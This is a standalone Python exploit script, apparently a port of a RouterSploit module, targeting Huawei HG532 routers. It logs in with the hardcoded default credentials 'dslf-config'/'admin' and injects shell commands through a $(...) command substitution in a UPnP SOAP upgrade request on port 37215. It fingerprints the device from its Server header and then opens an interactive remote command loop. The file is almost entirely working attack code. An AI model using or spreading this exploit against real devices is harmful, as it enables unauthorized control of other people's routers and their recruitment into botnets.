target = ""
# title: Huawei Router HG532 RCE
# rsf exploit module
# description: Module exploits remote command execution in Huawei Router HG532 devices.

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 37215
        self.username = "dslf-config"
        self.password = "admin"

    def http_request(self, method, path, **kwargs):
        url = f"http://{self.target}:{self.port}{path}"
        try:
            if method == "GET":
                return requests.get(url, **kwargs)
            elif method == "POST":
                return requests.post(url, auth=(self.username, self.password), **kwargs)
        except:
            return None

    def execute(self, cmd):
        payload = f"""<?xml version="1.0" ?>
    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
    <NewStatusURL>$({cmd})</NewStatusURL>
<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>
</u:Upgrade>
    </s:Body>
    </s:Envelope>"""
        response = self.http_request(
            method='POST',
            path='/ctrlt/DeviceUpgrade_1',
            data=payload
        )

        return response.text if response else ""

    def run(self):
        if self.check():
            print("[+] Target appears to be vulnerable")
            print("[*] Invoking command loop...")
            while True:
                try:
                    cmd = input("cmd> ")
                    if cmd.lower() in ('exit', 'quit'):
                        break
                    print(self.execute(cmd))
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[-] Error: {e}")
        else:
            print("[-] Target is not vulnerable")

    def check(self):
        response = self.http_request(method="GET", path="/")
        if response is not None and 'server' in response.headers and "Linux uPnP/1.0 Huawei-ATP-IGD" in response.headers['server']:
            return True
        return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
